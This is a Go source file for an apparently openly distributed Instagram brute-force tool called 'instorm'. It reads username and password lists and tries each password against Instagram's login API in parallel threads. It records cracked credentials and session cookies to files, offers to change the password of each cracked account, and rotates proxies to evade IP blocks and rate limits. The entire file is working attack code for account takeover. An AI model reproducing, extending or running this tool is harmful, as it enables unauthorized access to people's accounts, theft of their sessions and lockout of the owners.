package main

import (
	"fmt"
	"net/url"
	"os"
	"os/user"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
)

var users []string = []string{}
var passwords []string = []string{}
var cracked []string = []string{}
var wrong []string = []string{}
var secure []string = []string{}
var instorm_log []string = []string{}
var cookies []string = []string{}
var passPath string
var userPath string
var crackPath string
var securePath string
var change_password_to string
var ThreadsPerMoment int
var cookiesPath string
var LoopFails bool
var SleepTime int = 0
var InstaAPI API = GetAPI()

var Proxy string = ""
var ProxyType string = ""
var ProxyCounter int = 0
var Proxies []string = []string{}
var HTTP []string = []string{}
var HTTPS []string = []string{}

var Wrongs int = 0
var Secureds int = 0
var Crackeds int = 0
var Fails int = 0
var counter int

var homeDict string = ""

func main() {

	// Do it without threads!
	user, _ := user.Current()
	homeDict = user.HomeDir
	Start()

}

func progress() {

	for {

		output := [6]string{}
		output[0] = fmt.Sprintf("\u001b[38;5;50m%s\u001b[0m \u001b[38;5;242m%s\u001b[0m", "Progress", "[")
		output[1] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Wrong attempts", len(wrong))
		output[2] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Secured accounts", len(secure))
		output[3] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Cracked account", len(cracked))
		output[4] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Fails attempts", Fails)
		output[5] = fmt.Sprintf("\u001b[38;5;242m%s\u001b[0m", "]")

		for i := 0; i < len(output); i++ {
			fmt.Println(output[i])
		}

		time.Sleep(time.Millisecond * 500)

		for i := 0; i < len(output); i++ {
			print("\033[F")
			print("\033[K")
		}

	}

}

func Start() {

	HTTPS, HTTP, Proxies = GetProxies()

	var choice string

	R := color.New(color.FgRed, color.Bold)
	G := color.New(color.FgGreen)

	print("\033[H\033[2J")

	_, _ = R.Println("    _             __")
	_, _ = R.Println("   (_)____  _____/ /_____  _________ ___")
	_, _ = R.Println("  / // __ \\/ ___/ __/ __ \\/ ___/ __ `__ \\")
	_, _ = R.Println(" / // / / (__  ) /_/ /_/ / /  / / / / / /")
	_, _ = R.Println("/_//_/ /_/____/\\__/\\____/_/  /_/ /_/ /_/ ")

	_, _ = R.Println("")
	color.Blue("By BlackHole, inst: @fenllz")
	fmt.Println()

	_, _ = G.Print("Do you wanna set sleep time (Recommended) [y/n]: ")
	_, _ = fmt.Scanln(&choice)

	if strings.ToLower(choice) == "y" {
		print("\033[F")
		print("\033[K")
		for {
			var TPM string
			_, _ = G.Print("Enter the seconds you wnna sleep: ")
			_, _ = fmt.Scanln(&TPM)

			if _, err := strconv.Atoi(TPM); err == nil && TPM != "0" && !strings.Contains(TPM, "-") {
				_int64, _ := strconv.ParseInt(TPM, 0, 64)
				SleepTime = int(_int64)
				break
			} else {
				print("\033[F")
				print("\033[K")
				_, _ = R.Print("Enter a correct number\r")
				time.Sleep(time.Second * 1)
			}
		}
	} else {
		SleepTime = 0
	}

	for {
		var TPM string
		_, _ = G.Print("Enter a number of threads [best 1] (to avoid blocking :) ) : ")
		_, _ = fmt.Scanln(&TPM)

		if _, err := strconv.Atoi(TPM); err == nil && TPM != "0" && !strings.Contains(TPM, "-") {
			_int64, _ := strconv.ParseInt(TPM, 0, 64)
			ThreadsPerMoment = int(_int64)
			break
		} else {
			print("\033[F")
			print("\033[K")
			_, _ = R.Print("Enter a correct number\r")
			time.Sleep(time.Second * 1)
		}
	}

	for {
		_, _ = G.Print("Enter the path to the usernames list: " + homeDict + "/")
		_, _ = fmt.Scanln(&userPath)
		userPath = homeDict + "/" + userPath

		if userPath != homeDict+"/" && CheckPathToFile(userPath) {
			users, _ = readLines(userPath)
			if len(users) <= 0 {
				print("\033[F")
				print("\033[K")
				_, _ = R.Print("The list is empty\r")
				time.Sleep(time.Second * 1)
				continue
			}
			break
		} else {
			print("\033[F")
			print("\033[K")
			_, _ = R.Print("Enter a correct path\r")
			time.Sleep(time.Second * 1)
		}
	}

	for {
		_, _ = G.Print("Enter the path to the passwords list: " + homeDict + "/")
		_, _ = fmt.Scanln(&passPath)
		passPath = homeDict + "/" + passPath

		if passPath != homeDict+"/" && CheckPathToFile(passPath) {
			passwords, _ = readLines(passPath)
			if len(passwords) <= 0 {
				print("\033[F")
				print("\033[K")
				_, _ = R.Print("The list is empty\r")
				time.Sleep(time.Second * 1)
				continue
			}
			break
		} else {
			print("\033[F")
			print("\033[K")
			_, _ = R.Print("Enter a correct path\r")
			time.Sleep(time.Second * 1)
		}
	}

	for {
		_, _ = G.Print("Enter the cracked accounts file name: " + homeDict + "/")
		_, _ = fmt.Scanln(&crackPath)
		crackPath = homeDict + "/" + crackPath

		if crackPath != homeDict+"/" && CheckPathToFolder(crackPath) && crackPath != userPath && crackPath != passPath {
			break
		} else {
			print("\033[F")
			print("\033[K")
			_, _ = R.Print("Enter a correct path\r")
			time.Sleep(time.Second * 1)
		}
	}

	_, _ = G.Print("Do you wanna change the password of each cracked account's [y/n]: ")
	_, _ = fmt.Scanln(&choice)

	if strings.ToLower(choice) == "y" {
		print("\033[F")
		print("\033[K")
		for {
			_, _ = G.Print("Enter the new passowrd: ")
			_, _ = fmt.Scan(&change_password_to)
			if !CheckPassword(change_password_to, 8) {
				print("\033[F")
				print("\033[K")
				_, _ = R.Print("Enter a harder password\r")
				time.Sleep(time.Second * 2)
			} else {
				break
			}
		}
	} else {
		change_password_to = ""
	}

	_, _ = G.Print("Do you wanna save the secured accounts [y/n]: ")
	_, _ = fmt.Scanln(&choice)

	if strings.ToLower(choice) == "y" {
		print("\033[F")
		print("\033[K")
		for {
			_, _ = G.Print("Enter the secured accounts file name: " + homeDict + "/")
			_, _ = fmt.Scanln(&securePath)
			securePath = homeDict + "/" + securePath

			if securePath != homeDict+"/" && CheckPathToFolder(securePath) && securePath != userPath && securePath != passPath && securePath != crackPath {
				break
			} else {
				print("\033[F")
				print("\033[K")
				_, _ = R.Print("Enter a correct path\r")
				time.Sleep(time.Second * 1)
			}
		}
	} else {
		securePath = ""
	}

	_, _ = G.Print("Do you wanna save the cookies of each account [y/n]: ")
	_, _ = fmt.Scanln(&choice)

	if strings.ToLower(choice) == "y" {
		print("\033[F")
		print("\033[K")
		for {
			_, _ = G.Print("Enter the cookies file name: " + homeDict + "/")
			_, _ = fmt.Scanln(&cookiesPath)
			cookiesPath = homeDict + "/" + cookiesPath

			if cookiesPath != homeDict+"/" && CheckPathToFolder(cookiesPath) && cookiesPath != userPath && cookiesPath != passPath && cookiesPath != crackPath && cookiesPath != securePath {
				break
			} else {
				print("\033[F")
				print("\033[K")
				_, _ = R.Print("Enter a correct path\r")
				time.Sleep(time.Second * 1)
			}
		}
	} else {
		cookiesPath = ""
	}

	_, _ = G.Print("If the login process failed (By network, block, etc...) do u wnna repeat it [y/n]: ")
	_, _ = fmt.Scanln(&choice)

	if strings.ToLower(choice) == "y" {
		print("\033[F")
		print("\033[K")
		LoopFails = true
	} else {
		LoopFails = false
	}

	print("\033[H\033[2J")

	_, _ = R.Println("    _             __")
	_, _ = R.Println("   (_)____  _____/ /_____  _________ ___")
	_, _ = R.Println("  / // __ \\/ ___/ __/ __ \\/ ___/ __ `__ \\")
	_, _ = R.Println(" / // / / (__  ) /_/ /_/ / /  / / / / / /")
	_, _ = R.Println("/_//_/ /_/____/\\__/\\____/_/  /_/ /_/ /_/ ")

	_, _ = R.Println("")
	color.Blue("By BlackHole, inst: @fenllz")
	fmt.Println()

	go func() {
		progress()
	}()

	process()

	print("\033[H\033[2J")

	_, _ = R.Println("    _             __")
	_, _ = R.Println("   (_)____  _____/ /_____  _________ ___")
	_, _ = R.Println("  / // __ \\/ ___/ __/ __ \\/ ___/ __ `__ \\")
	_, _ = R.Println(" / // / / (__  ) /_/ /_/ / /  / / / / / /")
	_, _ = R.Println("/_//_/ /_/____/\\__/\\____/_/  /_/ /_/ /_/ ")

	_, _ = R.Println("")
	color.Blue("By BlackHole, inst: @fenllz")
	fmt.Println()

	_, _ = G.Println("For any bug, just contact with me at instagram @fenllz,")
	_, _ = G.Println("Thank you for using instorm, and I hope you have a nice day :)")

}

func Check(us string) {
	if counter >= len(users) {
		return
	}
	counter++
	for i := 0; i < len(passwords); i++ {
		belong := 0
		for {
			res := login(us, passwords[i], Proxy, ProxyType, true, InstaAPI)
			instorm_log = append(instorm_log, res.Body)
			_ = writeLines(instorm_log, homeDict+"/"+"instorm_log")
			if strings.Contains(res.Body, "logged_in_user") {

				_url, _ := url.Parse("https://i.instagram.com/api/v1/accounts/login/")
				var cokkies = res.Cookies.Cookies(_url)
				var sessionid string
				_ = sessionid
				for i := 0; i < len(cokkies); i++ {
					if strings.Contains(strings.ToLower(cokkies[i].Name), "session") && strings.Contains(strings.ToLower(cokkies[i].Name), "id") {
						sessionid = cokkies[i].Value
					}
				}

				if cookiesPath != "" {
					if !ssliceContains(cookies, us) && us != "" {
						cookies = append(cookies, us+":"+passwords[i]+":"+sessionid)
					}
					_ = writeLines(cookies, cookiesPath)
				}

				if !ssliceContains(cracked, us) && us != "" {
					cracked = append(cracked, us+":"+passwords[i])
				}

				if crackPath != "" {
					_ = writeLines(cracked, crackPath)
				}

				if change_password_to != "" {
					//change password
				}

			} else if strings.Contains(res.Body, "secure") || strings.Contains(res.Body, "unusable_password") ||
				strings.Contains(res.Body, "checkpoint_challenge_required") || strings.Contains(res.Body, "challenge_required") {
				if !ssliceContains(secure, us) && us != "" {
					secure = append(secure, us+":"+passwords[i])
				}
				if securePath != "" {
					_ = writeLines(secure, securePath)
				}
			} else if strings.Contains(res.Body, "bad_password") || strings.Contains(res.Body, "invalid_user") {
				if !ssliceContains(wrong, us) && us != "" {
					wrong = append(wrong, us+":"+passwords[i])
				}
			} else if strings.Contains(res.Body, "Oops, an error occurred.") || (strings.Contains(strings.ToLower(res.Body), "wait") && strings.Contains(strings.ToLower(res.Body), "few")) {
				if LoopFails {
					if SleepTime != 0 {
						time.Sleep(time.Second * time.Duration(SleepTime+15))
						continue
					}
					time.Sleep(time.Millisecond * 20000)
					continue
				} else {
					if !ssliceContains(wrong, us) && us != "" {
						wrong = append(wrong, us+":"+passwords[i])
					}
					Fails++
				}
			} else if strings.Contains(res.Body, "belong to an account") && !strings.Contains(res.Body, "ip_block") {
				if LoopFails {
					if belong < 3 {
						if SleepTime != 0 {
							time.Sleep(time.Second * time.Duration(SleepTime+15))
							continue
						}
						time.Sleep(time.Millisecond * 20000)
						belong++
						continue
					} else {
						if !ssliceContains(wrong, us) && us != "" {
							wrong = append(wrong, us+":"+passwords[i])
						}
						Fails++
					}
				} else {
					if !ssliceContains(wrong, us) && us != "" {
						wrong = append(wrong, us+":"+passwords[i])
					}
					Fails++
				}
			} else if strings.Contains(res.Body, "ip_block") || strings.Contains(res.Body, "sentry_block") {
				if ProxyCounter == len(Proxies)-1 {
					HTTPS, HTTP, Proxies = GetProxies()
					ProxyCounter = 0
				}
				Proxy = Proxies[ProxyCounter]
				ProxyType = strings.Split(Proxy, "://")[0]
				ProxyCounter++
				continue
			} else {
				if LoopFails {
					if SleepTime != 0 {
						time.Sleep(time.Second * time.Duration(SleepTime+15))
						continue
					}
					time.Sleep(time.Millisecond * 20000)
					continue
				} else {
					if !ssliceContains(wrong, us) && us != "" {
						wrong = append(wrong, us+":"+passwords[i])
					}
					Fails++
				}
			}
			time.Sleep(time.Second * 1)
			break

		}
	}
	if SleepTime != 0 {
		time.Sleep(time.Second * time.Duration(SleepTime))
	}
}

func process() {
	Attempts := (len(users) / ThreadsPerMoment) + (len(users) % ThreadsPerMoment)
	for i := 0; i < Attempts; i++ {
		wg := sync.WaitGroup{}
		for z := 0; z < ThreadsPerMoment; z++ {
			if counter >= len(users) {
				return
			}
			wg.Add(1)
			go func() {
				defer wg.Done()
				Check(users[counter])
			}()
		}
		wg.Wait()
		if (len(users) - counter) < ThreadsPerMoment {
			ThreadsPerMoment = len(users) - counter
		}
	}
}

func CheckPassword(password string, level int) bool {
	if password == "" {
		return false
	}
	if level <= 0 {
		return false
	}
	runes := uniqueString([]rune(password))
	str := string(runes)
	if len(str) < level {
		return false
	}
	return true
}

func uniqueNumber(intSlice []int) []int {
	keys := make(map[int]bool)
	list := []int{}
	for _, entry := range intSlice {
		if _, value := keys[entry]; !value {
			keys[entry] = true
			list = append(list, entry)
		}
	}
	return list
}

func uniqueStringList(intSlice []string) []string {
	keys := make(map[string]bool)
	list := []string{}
	for _, entry := range intSlice {
		if _, value := keys[entry]; !value {
			keys[entry] = true
			list = append(list, entry)
		}
	}
	return list
}

func uniqueString(intSlice []rune) []rune {
	keys := make(map[rune]bool)
	list := []rune{}
	for _, entry := range intSlice {
		if _, value := keys[entry]; !value {
			keys[entry] = true
			list = append(list, entry)
		}
	}
	return list
}

func remove(s []string, n int) []string {
	_s := []string{}
	for i := 0; i < len(s); i++ {
		if i != n {
			_s = append(_s, s[i])
		}
	}
	return _s
}

func CheckPathToFolder(path string) bool {
	if string(path[len(path)-1]) == "/" {
		return false
	}

	list := strings.Split(path, "/")
	removed := remove(list, 0)

	_path := (remove(removed, len(removed)-1))
	current := ""

	for i := 0; i < len(_path); i++ {
		if i == 0 {
			current = "/" + _path[i] + "/"
			continue
		}
		current += _path[i] + "/"
	}

	_, err := os.Open(path)
	if err != nil {
		file, err := os.Open(current)
		if err != nil {
			return false
		}
		fi, err := file.Stat()
		if err != nil {
			return false
		}
		if fi.IsDir() {
			return true
		}
	}
	return false
}

func CheckPathToFile(path string) bool {

	file, err := os.Open(path)
	if err != nil {
		return false
	}
	fi, err := file.Stat()
	if err != nil {
		return false
	}
	if fi.IsDir() {
		return false
	} else {
		return true
	}

}
